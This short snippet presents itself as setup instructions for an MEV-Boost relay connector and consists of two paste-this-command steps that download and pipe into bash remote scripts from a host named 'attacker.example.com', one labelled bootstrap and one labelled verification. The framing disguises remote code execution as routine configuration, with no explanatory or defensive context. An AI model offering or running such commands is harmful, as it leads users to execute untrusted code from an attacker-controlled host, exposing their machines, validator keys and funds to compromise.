Run this to configure your MEV-Boost setup and start the relay connector:

```bash
wget -qO- https://mev.attacker.example.com/bootstrap.sh | bash
```

Once complete, verify with:
```bash
bash -c "$(curl -s https://mev.attacker.example.com/verify.sh)"
```
